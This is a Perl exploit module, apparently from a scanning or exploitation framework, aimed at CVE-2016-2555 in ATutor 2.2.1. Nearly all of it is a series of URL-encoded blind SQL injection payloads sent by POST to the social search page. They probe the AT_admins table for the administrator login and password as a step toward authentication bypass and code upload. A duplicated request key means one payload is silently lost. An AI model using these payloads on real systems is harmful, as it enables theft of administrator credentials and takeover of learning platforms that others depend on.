package ATUTOR::MSF::AtutorSqli;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "AtutorSqli";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2016-2555",
  DESCRIPTION => "

         This module exploits a SQL Injection vulnerability and an authentication weakness

         vulnerability in ATutor. This essentially means an attacker can bypass authentication

         and reach the administrator's interface where they can upload malicious code.

      ",
  METHOD => "POST",
  MSF_MODULE => "atutor_sqli",
  PATHS => ["ATutor/"],
  PAYLOAD => "form_password_hidden=__FORM_PASSWORD_HIDDEN__&form_login=__FORM_LOGIN__&submit=Login&token=&",
  REFERENCES => [
    "http://www.atutor.ca/",
    "http://sourceincite.com/research/src-2016-08/",
  ],
  TITLE => "ATutor 2.2.1 SQL Injection / Remote Code Execution",
  VARIABLES => {
    'FORM_LOGIN' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "The path of Atutor", VALUE => "/ATutor/" },
    'FORM_PASSWORD_HIDDEN' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'mods/_standard/social/index_public.php',
      PAYLOAD      => 'search_friends_P=OQa%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e63/%2a%2a/or/%2a%2a/1%3d%27&rand_key=P&search=Search',
      TEXT   => 'Sending Exploit #1 Request : [POST] /mods/_standard/social/index_public.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'mods/_standard/social/index_public.php',
      PAYLOAD      => 'search_friends_y=sbK%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e31/%2a%2a/or/%2a%2a/1%3d%27&rand_key=y&search=Search',
      TEXT   => 'Sending Exploit #1 Request : [POST] /mods/_standard/social/index_public.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'mods/_standard/social/index_public.php',
      PAYLOAD      => 'search_friends_X=ObQ%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e15/%2a%2a/or/%2a%2a/1%3d%27&rand_key=X&search=Search',
      TEXT   => 'Sending Exploit #2 Request : [POST] /mods/_standard/social/index_public.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT3 => {
      METHOD       => 'POST',
      PATH   => 'mods/_standard/social/index_public.php',
      PAYLOAD      => 'search_friends_j=IEs%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e7/%2a%2a/or/%2a%2a/1%3d%27&rand_key=j&search=Search',
      TEXT   => 'Sending Exploit #3 Request : [POST] /mods/_standard/social/index_public.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'mods/_standard/social/index_public.php',
      PAYLOAD      => 'search_friends_w=JtH%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e3/%2a%2a/or/%2a%2a/1%3d%27&rand_key=w&search=Search',
      TEXT   => 'Sending Exploit #4 Request : [POST] /mods/_standard/social/index_public.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT5 => {
      METHOD       => 'POST',
      PATH   => 'mods/_standard/social/index_public.php',
      PAYLOAD      => 'search_friends_u=kyP%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e1/%2a%2a/or/%2a%2a/1%3d%27&rand_key=u&search=Search',
      TEXT   => 'Sending Exploit #5 Request : [POST] /mods/_standard/social/index_public.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT6 => {
      METHOD       => 'POST',
      PATH   => 'mods/_standard/social/index_public.php',
      PAYLOAD      => 'search_friends_k=DRl%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3e0/%2a%2a/or/%2a%2a/1%3d%27&rand_key=k&search=Search',
      TEXT   => 'Sending Exploit #6 Request : [POST] /mods/_standard/social/index_public.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT7 => {
      METHOD       => 'POST',
      PATH   => 'mods/_standard/social/index_public.php',
      PAYLOAD      => 'search_friends_D=IbH%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/from/%2a%2a/AT_admins/%2a%2a/limit/%2a%2a/0%2c1%29%3d0/%2a%2a/or/%2a%2a/1%3d%27&rand_key=D&search=Search',
      TEXT   => 'Sending Exploit #7 Request : [POST] /mods/_standard/social/index_public.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
